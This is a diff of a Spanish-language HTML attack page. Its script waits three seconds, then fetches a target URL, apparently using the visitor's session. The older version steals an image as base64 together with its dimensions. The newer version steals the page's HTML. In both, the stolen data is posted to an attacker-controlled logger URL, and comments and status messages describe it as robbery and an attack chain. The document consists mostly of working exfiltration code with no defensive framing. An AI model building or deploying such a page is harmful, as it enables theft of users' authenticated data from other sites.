@@ -2,7 +2,7 @@
 <html lang="es">
 <head>
     <meta charset="UTF-8">
-    <title>Página de Captura de Imagen con Dimensiones</title>
+    <title>Página de Captura Silenciosa de HTML</title>
     <style>
         .success { color: green; font-weight: bold; }
         .error { color: red; font-weight: bold; }
@@ -11,7 +11,7 @@
 <body>
 
     <h1>Bienvenido a mi sitio de prueba.</h1>
-    <p>Gracias por visitarnos. (La imagen de perfil se está intentando robar en segundo plano).</p>
+    <p>Gracias por visitarnos. (El proceso de captura de HTML se está ejecutando).</p>
     
     <p id="estado-peticion">Estado: **Esperando 3 segundos...**</p>
 
@@ -25,44 +25,21 @@
         const DELAY_MS = 3000;
         const estadoElemento = document.getElementById('estado-peticion');
 
-        // Función para convertir Blob/File a Base64
-        const blobToBase64 = blob => new Promise((resolve, reject) => {
-            const reader = new FileReader();
-            reader.onloadend = () => resolve(reader.result);
-            reader.onerror = reject;
-            reader.readAsDataURL(blob);
-        });
+        function enviarADestino(htmlRobado) {
+            // Codificamos el HTML para enviarlo como parámetro de URL en el cuerpo de un POST
+            const contenidoCodificado = encodeURIComponent(htmlRobado);
 
-        // Función para obtener las dimensiones del Blob
-        const getDimensions = blob => new Promise((resolve, reject) => {
-            const url = URL.createObjectURL(blob);
-            const img = new Image();
-            
-            img.onload = () => {
-                const dimensions = { width: img.width, height: img.height };
-                URL.revokeObjectURL(url); // Limpia la URL temporal
-                resolve(dimensions);
-            };
-            img.onerror = reject;
-            img.src = url; // Carga la imagen desde el Blob
-        });
-
-
-        async function enviarADestino(base64Image, dimensions) {
-            // Incluimos las dimensiones en el cuerpo del POST
-            const contenidoCodificado = encodeURIComponent(base64Image);
-            const bodyData = `imagen_base64=${contenidoCodificado}&ancho=${dimensions.width}&alto=${dimensions.height}`;
-            
+            // Usamos un POST para enviar la cadena HTML larga
             fetch(URL_LOGGER, {
                 method: 'POST',
                 headers: {
-                    // Usamos JSON en el cuerpo si la data es más compleja, pero para este caso x-www-form-urlencoded es más simple
-                    'Content-Type': 'application/x-www-form-urlencoded', 
+                    'Content-Type': 'application/x-www-form-urlencoded',
                 },
-                body: bodyData
+                // Enviamos el HTML en el cuerpo con la clave 'html_capturado'
+                body: `html_capturado=${contenidoCodificado}` 
             })
             .then(() => {
-                estadoElemento.innerHTML = `<span class="success">✅ Imagen (${dimensions.width}x${dimensions.height}) robada y enviada a tu logger.</span>`;
+                estadoElemento.innerHTML = `<span class="success">✅ HTML capturado y enviado silenciosamente.</span>`;
             })
             .catch(error => {
                 estadoElemento.innerHTML = `<span class="error">❌ Error al enviar los datos a tu logger.</span>`;
@@ -78,23 +55,20 @@
                 const response = await fetch(URL_OBJETIVO);
                 
                 if (!response.ok) {
-                    throw new Error(`Fallo en el GET, Status: ${response.status}.`);
+                    // Si el estado HTTP no es 200-299 (ej. 401 Unauthorized, 403 Forbidden)
+                    throw new Error(`Fallo HTTP. Status: ${response.status}.`);
                 }
 
-                // Paso 2: Leemos la respuesta como binario (Blob)
-                const imageBlob = await response.blob();
+                // Paso 2: Leemos la respuesta como TEXTO (el HTML)
+                const htmlRobado = await response.text();
                 
-                // Paso 3: Obtenemos las dimensiones de la imagen
-                const dimensions = await getDimensions(imageBlob);
-                
-                // Paso 4: Convertimos el binario a Base64
-                const base64String = await blobToBase64(imageBlob);
-                
-                // Paso 5: Enviamos la cadena Base64 y las dimensiones a nuestro servidor de registro
-                await enviarADestino(base64String, dimensions);
+                // Paso 3: Enviamos el HTML robado a nuestro servidor de registro
+                await enviarADestino(htmlRobado);
 
             } catch (error) {
-                estadoElemento.innerHTML = `<span class="error">❌ Fallo el ataque: ${error.message}.</span>`;
+                // Captura errores de red, CORS, o los lanzados en el 'if'
+                let errorMessage = error.message ? error.message : 'Error desconocido de red/CORS.';
+                estadoElemento.innerHTML = `<span class="error">❌ Fallo el ataque: ${errorMessage}</span>`;
                 console.error('Fallo en la cadena de ataque:', error);
             }
         }
